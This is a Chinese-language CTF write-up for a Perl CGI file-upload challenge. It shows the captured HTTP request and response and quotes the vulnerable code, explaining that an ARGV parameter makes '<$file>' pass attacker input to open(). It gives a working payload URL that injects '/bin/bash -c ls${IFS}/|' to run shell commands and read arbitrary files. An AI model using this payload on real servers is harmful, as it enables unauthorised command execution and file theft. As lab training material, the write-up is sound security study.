## i-got-id-200

用perl写的网站

然而我不会perl......

有个文件上传界面

上传完会把文件里的东西以文本格式读出来显示在页面上

还是先抓个包看看

```text
POST /cgi-bin/file.pl HTTP/1.1
Host: 111.198.29.45:57795
Content-Length: 292
Cache-Control: max-age=0
Origin: http://111.198.29.45:57795
Upgrade-Insecure-Requests: 1
DNT: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryDYZHzjAneIJ2wk7a
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://111.198.29.45:57795/cgi-bin/file.pl
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: PHPSESSID=pqnmaqdihhvciqqc9uhaeod893
Connection: close


------WebKitFormBoundaryDYZHzjAneIJ2wk7a
Content-Disposition: form-data; name="file"; filename="233.txt"
Content-Type: text/plain

23333333
------WebKitFormBoundaryDYZHzjAneIJ2wk7a
Content-Disposition: form-data; name="Submit!"

Submit!
------WebKitFormBoundaryDYZHzjAneIJ2wk7a--
```

```text
HTTP/1.1 200 OK
Date: Thu, 16 Jan 2020 13:57:38 GMT
Server: Apache/2.4.18 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 564
Connection: close
Content-Type: text/html; charset=ISO-8859-1

<!DOCTYPE html
	PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
	"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"
>
<html xmlns="http://www.w3.org/1999/xhtml" lang="en-US" xml:lang="en-US">
	<head>
		<title>Perl File Upload</title>
		<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
	</head>
	<body>
		<h1>Perl File Upload</h1>
		<form method="post" enctype="multipart/form-data">
			File: <input type="file" name="file" />
			<input type="submit" name="Submit!" value="Submit!" />
		</form>
		<hr />
23333333<br /></body></html>
```

查阅资料发现Perl CGI 有个很经典的漏洞类似这个题目

```perl
use strict;
use warnings;
use CGI;
my $cgi = CGI->new;
if ( $cgi->upload( 'file' ) ) {
    my $file = $cgi->param( 'file' );
    while ( <$file> ) {
    	print "$_";
    }
}
```

问题就处在这个<$file>上

- “<>” doesn’t work with strings 
  -  Unless the string is “ARGV” 
- In that case, “<>” loops through the ARG values 
  - Inserting each one to an open() call! 

所以我们试着加个ARGV就可以利用open()任意读文件了
根据参考资料中的ppt我们甚至可以用bash遍历一下目录

```
/cgi-bin/file.pl?/bin/bash%20-c%20ls${IFS}/| #遍历根目录
```

找到flag

直接读一下即可

## 参考资料

Perl CGI 问题：https://www.blackhat.com/docs/asia-16/materials/asia-16-Rubin-The-Perl-Jam-2-The-Camel-Strikes-Back.pdf

